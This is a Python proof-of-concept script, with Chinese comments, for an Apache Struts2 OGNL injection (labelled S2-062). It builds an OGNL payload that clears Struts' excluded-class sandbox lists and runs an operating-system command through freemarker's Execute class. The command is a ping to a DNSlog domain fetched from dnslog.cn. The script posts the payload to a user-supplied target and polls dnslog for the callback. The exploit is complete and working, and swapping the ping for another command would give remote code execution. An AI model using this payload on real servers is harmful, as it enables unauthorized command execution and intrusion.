# -*- coding:utf-8 -*-
import time
import requests
import argparse
import threading
import sys
class DNSlog():
    def __init__(self):
        self.headers=headers = {
        'Cookie': 'UM_distinctid=17d9ee9b99ad5-08c6a2266360e7-4c3f2779-1fa400-17d9ee9b99b2b1; CNZZDATA1278305074=259968647-1640606623-%7C1643011913; PHPSESSID=kolveuasn829nk9s0jfffjg4n2'
        }

    def getdomain(self):
        getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers=self.headers, timeout=60)
        global domain
        domain = str(getdomain.text)
        print(domain)

    def TestingData(self):
        print("正在监听dnslog")
        for i in range(20):
            print(i)
            refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers=self.headers, timeout=60)
            time.sleep(1)
            if domain in refresh.text:
                print("发现dns请求,漏洞可能存在,请手动验证")
                sys.exit()
            if i==14:
                print("未监听到dnslog回显")
                sys.exit()

def s2_068():
    print("发送POC请求")
    cookies = {"JSESSIONID": "B2280F028673CB6703065891B207DB79",
                     "JSESSIONID": "node01571qmcb025l61i1wb3imwfz6m0.node0"}
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6", "Connection": "close",
                         "Content-Type": "application/x-www-form-urlencoded"}
    data = {par: Parameter}
    requests.post(url, headers=headers,cookies=cookies, data=data)

class UrlEncod():
    def __init__(self,dnslog):
        self.poc='''(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))'''.replace("exec({'id","exec({'"+"ping "+dnslog)
    def encode(self):
        encode_string = ""
        poc=self.poc
        for char in poc:
            encode_char = hex(ord(char)).replace("0x","%")
            encode_string += encode_char
        return encode_string.replace("%a",""),self.poc


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='S2-062验证')
    parser.add_argument('--url', help="要验证的URL", default="")
    parser.add_argument('--par', help="要验证的参数", default="")
    args = parser.parse_args()
    url=args.url
    par=args.par
    print(f"你要验证的URL为{url}")
    print(f"你要验证的参数为{par}")
    dnslog=DNSlog()
    dnslog.getdomain()
    urlencode=UrlEncod(domain)
    payload,Parameter=urlencode.encode()
    print(f"burp POC URL编码为:{payload}")

    t1 = threading.Thread(target=s2_068,daemon=True)
    t1.start()

    dnslog.TestingData()